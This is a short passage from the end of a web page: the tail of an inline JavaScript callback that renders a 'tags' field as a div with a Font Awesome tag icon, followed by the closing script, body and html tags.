        if (prop === 'tags') {
          if (value === '') {
            return `${value}`;
          } else {
            return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
          }
        }
      }
    });
  });
</script>

  </body>
</html>

